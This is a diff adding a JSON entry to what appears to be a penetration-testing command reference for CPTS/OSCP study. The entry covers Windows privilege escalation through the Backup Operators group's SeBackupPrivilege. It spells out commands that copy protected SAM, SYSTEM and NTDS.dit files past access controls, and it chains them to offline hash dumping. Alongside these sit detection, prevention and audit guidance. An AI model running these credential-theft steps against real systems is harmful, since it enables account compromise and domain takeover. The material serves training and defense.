@@ -1,0 +1,90 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "powershell",
+    "sebackupprivilege"
+  ],
+  "tags": [
+    "sebackup",
+    "backup-operators"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Backup Operators",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Load the SeBackupPrivilege modules and enable it",
+      "command": "Import-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll"
+    },
+    {
+      "label": "Enable the privilege",
+      "command": "Set-SeBackupPrivilege"
+    },
+    {
+      "label": "Copy a protected file out",
+      "command": "Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt"
+    }
+  ],
+  "notes": "=== SeBackupPrivilege — File Copy Bypassing ACL ===\nBackup Operators get SeBackupPrivilege — use FILE_FLAG_BACKUP_SEMANTICS to bypass any file ACL.\n\n=== WHAT SeBackupPrivilege DOES ===\nOS flag FILE_FLAG_BACKUP_SEMANTICS instructs Windows to bypass normal ACL enforcement.\nStandard copy/cat commands do NOT use this flag → will be denied normally.\nSeBackupPrivilege PoC library exposes Copy-FileSeBackupPrivilege which uses the correct flag.\n\n=== ATTACK FLOW ===\n1. Confirm group membership: whoami /groups | findstr Backup\n2. Transfer SeBackupPrivilege DLLs to target\n3. Enable the privilege (Disabled by default):\n   Import-Module .\\SeBackupPrivilegeCmdLets.dll\n   Import-Module .\\SeBackupPrivilegeUtils.dll\n   Set-SeBackupPrivilege\n   whoami /priv | findstr Backup   → must show Enabled\n4. Copy protected file:\n   Copy-FileSeBackupPrivilege 'C:\\Windows\\System32\\config\\SAM' '.\\SAM'\n   Copy-FileSeBackupPrivilege 'C:\\Windows\\System32\\config\\SYSTEM' '.\\SYSTEM'\n\nALTERNATIVE — robocopy backup mode (no extra tools):\n  robocopy /B C:\\Windows\\System32\\config .\\config SAM SYSTEM SECURITY\n\n=== KEY REQUIREMENT ===\nBackup Operators are permitted to LOG ON LOCALLY to Domain Controllers.\nThis enables running the attack directly on the DC — which is where the payoff is.\n\n=== CHAINING CONTEXT ===\nCopy SAM + SYSTEM → secretsdump.py SAM SYSTEM LOCAL → local account hashes\nLocal admin hash reuse (imaged environments) → instant access to other hosts\nSeBackupPrivilege also enables NTDS.dit extraction (see sebackup-ntds-diskshadow)\nCopy web.config, KeePass .kdbx, .rdp files too\n\n=== WHAT TO LOOK FOR ===\nAny non-admin account in Backup Operators = critical finding\nService accounts added to Backup Operators for backup software = frequently overlooked\nrobocopy /B requires no extra tools — zero footprint when tool transfer is blocked",
+  "references": [
+    {
+      "title": "SeBackupPrivilege (giuliano108)",
+      "url": "https://github.com/giuliano108/SeBackupPrivilege"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sebackup-ntds-diskshadow",
+      "note": "Chain it with a shadow copy to steal ntds.dit on a DC.",
+      "rel": "next"
+    },
+    {
+      "id": "ref-files-of-interest",
+      "note": "Which protected files are worth copying.",
+      "rel": "next"
+    }
+  ],
+  "id": "sebackup-copy-file",
+  "name": "Backup Operators - Copy Protected File (SeBackupPrivilege)",
+  "command": "Copy-FileSeBackupPrivilege '<protected_file>' .\\out.txt",
+  "description": "Members of Backup Operators hold SeBackupPrivilege, which bypasses file ACLs for reads. Import the SeBackupPrivilege cmdlets, enable the privilege, then copy any file regardless of its DACL.",
+  "opsec": "loud",
+  "mitre": [
+    "T1006"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "SeBackupPrivilege grants the FILE_FLAG_BACKUP_SEMANTICS API flag that bypasses normal NTFS ACL enforcement for file reads. The SeBackupPrivilege PowerShell library exposes Copy-FileSeBackupPrivilege which uses this flag, allowing members of Backup Operators to read any file on the system regardless of permissions — including SAM, SYSTEM, and NTDS.dit.",
+    "prerequisites": "SeBackupPrivilege assigned (Backup Operators group membership or explicit assignment). SeBackupPrivilege must be enabled in the current token (via Set-SeBackupPrivilege). Elevated shell to bypass UAC.",
+    "impact": "Read access to any file on the system regardless of ACL. Enables extraction of SAM/SYSTEM hives for local credential dumping or NTDS.dit for domain credential dumping.",
+    "detection": "File access events via backup semantics API on protected files (SAM, SECURITY, NTDS.dit). Audit: Backup Operators group member reads sensitive registry hives. Event ID 4656 with FILE_FLAG_BACKUP_SEMANTICS flag.",
+    "artifacts": "Audit log: file read on SAM/SYSTEM by backup operator | Event 4656: handle requested on sensitive file | SAM.SAV/SYSTEM.SAV files created in staging directory",
+    "prevention": "Audit Backup Operators group membership — treat as equivalent to Domain Admin. Restrict local DC logon for Backup Operators unless operationally required. Require MFA for Backup Operators accounts. Monitor file access to SAM, SECURITY, NTDS.dit.",
+    "misconfiguration": "Accounts added to Backup Operators without understanding the privilege implications. No monitoring on sensitive file access using backup semantics.",
+    "vulnerable_config": "# User in Backup Operators\nwhoami /groups | findstr 'Backup'\n\n# Copy protected file bypassing ACL:\nSet-SeBackupPrivilege\nCopy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt\n\n# Copy SAM/SYSTEM for offline cracking:\nreg save HKLM\\SAM SAM.SAV\nreg save HKLM\\SYSTEM SYSTEM.SAV",
+    "secure_config": "# Audit Backup Operators\nGet-LocalGroupMember -Group 'Backup Operators'\n\n# Monitor sensitive file access (File System auditing via GPO)\n# Enable: Audit Object Access > Success + Failure on:\n# C:\\Windows\\System32\\config\\SAM\n# C:\\Windows\\System32\\config\\SECURITY\n# C:\\Windows\\NTDS\\ntds.dit",
+    "sources": [
+      "HTB M26",
+      "MITRE T1003.002",
+      "MITRE T1078.002"
+    ]
+  }
+}
